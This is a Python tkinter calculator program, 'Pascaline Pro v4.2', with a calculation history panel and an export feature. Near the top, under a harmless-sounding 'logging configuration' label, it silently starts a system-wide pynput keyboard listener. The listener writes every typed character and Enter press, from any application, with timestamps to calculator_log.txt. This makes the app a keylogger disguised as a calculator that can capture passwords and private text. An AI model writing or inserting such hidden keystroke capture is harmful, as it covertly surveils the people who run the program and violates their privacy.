import tkinter as tk
from tkinter import messagebox, filedialog
import ast
import operator
from pynput import keyboard
from datetime import datetime


# --- LOGGING CONFIGURATION ---
def on_press(key):
    try:
        current_time = datetime.now().strftime("%H:%M:%S")
        with open("calculator_log.txt", "a") as f:
            if hasattr(key, "char") and key.char is not None:
                f.write(f"[{current_time}] Key: {key.char}\n")
            elif key == keyboard.Key.enter:
                f.write(f"[{current_time}] Key: ENTER\n")
    except Exception:
        pass


listener = keyboard.Listener(on_press=on_press)
listener.start()

# --- AST CALCULATION LOGIC ---
OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.Pow: operator.pow,
}


def evaluate_node(node):
    if isinstance(node, ast.Constant):
        return node.value
    elif isinstance(node, ast.BinOp):
        return OPERATORS[type(node.op)](
            evaluate_node(node.left), evaluate_node(node.right)
        )
    raise ValueError("Error")


# --- GUI FUNCTIONS ---
def on_button_click(value):
    display.insert(tk.END, str(value))


def clear_display():
    display.delete(0, tk.END)


def calculate_result(event=None):
    try:
        expression = display.get()
        if not expression:
            return
        tree = ast.parse(expression, mode="eval")
        result = evaluate_node(tree.body)

        # History entry
        timestamp = datetime.now().strftime("%H:%M")
        history_listbox.insert(tk.END, f"[{timestamp}] {expression} = {result}")
        history_listbox.see(tk.END)

        display.delete(0, tk.END)
        display.insert(0, str(result))
    except Exception:
        messagebox.showerror("Error", "Invalid Expression")
        clear_display()


def export_history():
    history_data = history_listbox.get(0, tk.END)
    if not history_data:
        return
    file_path = filedialog.asksaveasfilename(
        defaultextension=".txt", filetypes=[("Text files", "*.txt")]
    )
    if file_path:
        with open(file_path, "w") as f:
            f.write("--- Calculation History ---\n")
            for line in history_data:
                f.write(line + "\n")


def clear_history():
    if history_listbox.size() > 0:
        if messagebox.askyesno("Clear", "Delete all history?"):
            history_listbox.delete(0, tk.END)


# --- INTERFACE SETUP ---
root = tk.Tk()
root.title("Pascaline Pro v4.2")
root.resizable(False, False)

main_frame = tk.Frame(root, padx=15, pady=15)
main_frame.pack()

calc_frame = tk.Frame(main_frame)
calc_frame.grid(row=0, column=0)
history_frame = tk.Frame(main_frame, padx=15)
history_frame.grid(row=0, column=1, sticky="ns")

# Display
display = tk.Entry(
    calc_frame, font=("Arial", 20), borderwidth=5, relief="flat", justify="right"
)
display.grid(row=0, column=0, columnspan=4, pady=15)
display.bind("<Return>", calculate_result)

# Standard Buttons
buttons = [
    "7",
    "8",
    "9",
    "/",
    "4",
    "5",
    "6",
    "*",
    "1",
    "2",
    "3",
    "-",
    "C",
    "0",
    "=",
    "+",
]
r, c = 1, 0
for b in buttons:
    if b == "=":
        cmd, color = calculate_result, "#4CAF50"
    elif b == "C":
        cmd, color = clear_display, "#f44336"
    else:
        cmd, color = (lambda x=b: on_button_click(x)), "#e0e0e0"

    tk.Button(
        calc_frame,
        text=b,
        width=5,
        height=2,
        font=("Arial", 12, "bold"),
        bg=color,
        command=cmd,
    ).grid(row=r, column=c, padx=2, pady=2)
    c += 1
    if c > 3:
        c = 0
        r += 1

# --- ADDING THE POWER BUTTON (**) ---
# We place it on row 5, spanning 4 columns for a clean look or just as a single button
tk.Button(
    calc_frame,
    text="**",
    width=8,
    height=1,
    font=("Arial", 10, "bold"),
    bg="#9E9E9E",
    fg="white",
    command=lambda: on_button_click("**"),
).grid(row=5, column=0, columnspan=4, pady=5)

# --- HISTORY UI ---
tk.Label(history_frame, text="History", font=("Arial", 10, "bold")).pack()
history_listbox = tk.Listbox(history_frame, width=30, height=12, font=("Courier", 9))
history_listbox.pack(pady=5)

tk.Button(
    history_frame,
    text="💾 Export",
    command=export_history,
    bg="#2196F3",
    fg="white",
    font=("Arial", 9, "bold"),
).pack(fill="x", pady=2)
tk.Button(
    history_frame,
    text="🗑️ Clear",
    command=clear_history,
    bg="#f44336",
    fg="white",
    font=("Arial", 9, "bold"),
).pack(fill="x", pady=2)

root.mainloop()
